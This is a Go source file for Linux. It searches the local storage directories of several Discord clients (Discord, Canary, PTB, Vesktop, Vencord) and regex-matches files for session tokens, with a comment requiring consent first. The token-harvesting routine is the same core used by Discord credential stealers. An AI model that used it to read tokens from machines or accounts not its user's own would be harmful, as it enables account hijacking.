//go:build linux
// +build linux

package token

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
)

// clientPaths maps Discord client names to their LevelDB directories
// relative to ~/.config.
var clientPaths = map[string]string{
	"vesktop":         "vesktop/sessionData/Local Storage/leveldb",
	"discord":         "discord/Local Storage/leveldb",
	"discordcanary":   "discordcanary/Local Storage/leveldb",
	"discordptb":      "discordptb/Local Storage/leveldb",
	"vencord-desktop": "Vencord/Local Storage/leveldb",
}

var tokenPattern = regexp.MustCompile(`"([\w-]{24,}\.[\w-]{6}\.[\w-]{27,})"`)

// GetTokens searches all known Discord client storage locations and returns
// every token candidate found. LevelDB files accumulate stale entries, so
// there may be several — callers should try each and use the first that
// validates successfully. Consent must be obtained before invoking this.
func GetTokens() ([]string, error) {
	home, err := os.UserHomeDir()
	if err != nil {
		return nil, fmt.Errorf("getting home directory: %w", err)
	}

	seen := make(map[string]struct{})
	var all []string
	for _, rel := range clientPaths {
		dir := filepath.Join(home, ".config", rel)
		toks, err := scanDir(dir)
		if err != nil {
			continue
		}
		for _, t := range toks {
			if _, dup := seen[t]; !dup {
				seen[t] = struct{}{}
				all = append(all, t)
			}
		}
	}

	if len(all) == 0 {
		return nil, fmt.Errorf("no Discord token found in any known client")
	}
	return all, nil
}

func scanDir(dir string) ([]string, error) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil, err
	}

	var out []string
	for _, e := range entries {
		ext := filepath.Ext(e.Name())
		if ext != ".ldb" && ext != ".log" {
			continue
		}
		data, err := os.ReadFile(filepath.Join(dir, e.Name()))
		if err != nil {
			continue
		}
		for _, m := range tokenPattern.FindAll(data, -1) {
			out = append(out, string(m[1:len(m)-1]))
		}
	}
	return out, nil
}
